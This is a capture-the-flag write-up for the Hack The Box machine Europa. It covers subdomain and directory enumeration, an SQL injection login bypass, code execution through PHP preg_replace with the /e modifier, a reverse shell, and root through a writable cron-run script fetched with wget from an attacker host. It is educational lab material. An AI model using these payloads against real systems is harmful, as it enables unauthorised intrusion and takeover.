## HTB Europa (Medium) - Writeup

Difficulty: Medium

Bypassed login page via SQL injection, allowing admin access.  
Discovered a vulnerable OpenVPN config generator abusing preg_replace() with the /e modifier for RCE.  
Gained a reverse shell using a crafted payload in the ipaddress parameter.  
Escalated to root by placing a malicious script in a writable cron-executed directory.  

---

## Nmap 

#### The nmap scan revealed three open ports:  

![obraz](https://github.com/user-attachments/assets/e5ef597a-977d-4b69-8545-41087b5f7b79)


## Port 80 - Default apache  

It's running default apache page:  

![obraz](https://github.com/user-attachments/assets/d74c48af-a3b9-42d5-9cee-8ef2c2f918e8)

Let's go to https



## Port 443 - https website  

Site's certificates revealed some subdomains:  
+  admin-portal.europacorp.htb
+  www.europacorp.htb
+  europacorp.htb

We'll add them to /etc/hosts 

admin-portal.europacorp.htb contains login page:  

![obraz](https://github.com/user-attachments/assets/cbdbc1ec-1459-4e8d-a168-38dcc44da9c0)

We can try discoevring other subdomains:  
```
wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://admin-portal.europacorp.htb -H "Host: FUZZ.europacorp.htb" --hw 1049
```
It didn't found anything new.  

We'll now run directory busting against login page, we know that it uses php so we'll add php extension:  
```
feroxbuster --url https://admin-portal.europacorp.htb/ -x php -k
```

![obraz](https://github.com/user-attachments/assets/4783e358-64e7-44ff-bd3d-c99256f60359)

There are some intresting files like db.php but we can't view them without any type of LFI or similar.  
/logs and /data returns forbidden access.  



## SQLi - authentication bypass  

We can catch login request with burpsuite and add a single quote to username.  
It returns an error which is a good sign of possible sqli vulnerability:    

![obraz](https://github.com/user-attachments/assets/7c866e41-d791-4126-a097-2e03a53fa2e5)

The one bypass technique that worked was using valid username and then commenting out the rest:  
```
admin@europacorp.htb'-- -
```
It will check if user is valid and then cancel checking if password is valid:  

![obraz](https://github.com/user-attachments/assets/f7e69f98-87f2-4a15-821b-a995dfedb093)

The query that is vulnerable to this bypass looks like this:  
```
SELECT * FROM users WHERE email='$email' and password='$password_hash';
```

![obraz](https://github.com/user-attachments/assets/4c0fc184-2ea8-421f-8e39-89439782c998)

We're logged in!  



## Abusing tools.php

There is a tool - openvpn config generator  
Located in /tools.php directory.  

![obraz](https://github.com/user-attachments/assets/5c523302-6de8-4ddd-9c13-76106443e06c)

Let's take a look at this request with burpsuite:  

![obraz](https://github.com/user-attachments/assets/44f31c71-321b-461c-9f3e-79f4c2cfb407)

It takes three parameters:
+ pattern
+ ipaddress
+ text

pattern has the value /ip_address/, which looks like a regex.  
In php to do a regex one of the preg_  family functions is used.  
We are able to input ip address once but it gets replaced a few times in final config file.  
It most likely uses preg_replace to do that.  
It is one of the dangerous php functions that allows us to execute php code.  
I recommend reading this article to understand how it works:  
```
https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4
```

If we add "e" modifier in the pattern we will be able to execute code.  
Let's take a look at article's exploitation example:  

![obraz](https://github.com/user-attachments/assets/fea10a24-8930-46d4-9b3a-74270e56035e)

When done it looks something like that:  
+  preg_replace(/a/e, system("id"), a)

Let's try it:  

![obraz](https://github.com/user-attachments/assets/7dc61ae1-fb65-4498-bdfc-e9d3cd7b05f5)


It works!, now we need to put reverse shell there:  

![obraz](https://github.com/user-attachments/assets/96e40a3c-338e-4cb9-a16a-0048abfca1f0)

And we get a connection back:   

![obraz](https://github.com/user-attachments/assets/15a0156f-4847-45aa-80d7-7145a0450884)




## Priv Esc to root

First thing I checked was db.php:  

![obraz](https://github.com/user-attachments/assets/5f172ec8-cf6b-4d75-91bd-3b9470c683a7)

Mysql didn't reveal anything new.  
The vulnerable query  that allowed authentication bypass was:  

![obraz](https://github.com/user-attachments/assets/1ed45424-dc85-4cb3-91fd-bd897261b8da)

There is also a script called clearlogs:  

![obraz](https://github.com/user-attachments/assets/dbead88c-4419-41f7-9907-a07f1de09d86)

This script is likely executed by a cron job to regularly clear the logs.  
With pspy64 we can verify if it's running as a cronjob:  

![obraz](https://github.com/user-attachments/assets/a04d75d5-1fee-499d-8748-b75a96f839a4)

It does run as cron job:  
+  /usr/bin/php /var/www/cronjobs/clearlogs
+  /bin/sh -c /var/www/cronjobs/clearlogs

There is a line in this file that is very intresting:  
+  exec('/var/www/cmd/logcleared.sh');

It turns out that we own /var/www/cmd directory.  
All we need to do now is to change logcleared.sh  

![obraz](https://github.com/user-attachments/assets/45c1d263-5ddc-45c2-9843-6172a9f0ce9a)
```
wget http://<attacker ip>/logcleared.sh
```

![obraz](https://github.com/user-attachments/assets/e7b9522c-67f1-48fa-9c54-749f7751902d)

Now start a listener and wait for it to execute.  
After that we can retrieve both flags:  

![obraz](https://github.com/user-attachments/assets/84cccdca-44a6-492f-b6b6-f377bc73b416)

![obraz](https://github.com/user-attachments/assets/38a3d2c8-3e4e-4922-bd45-8129407b1e1a)

Thank you for reading!!  

























































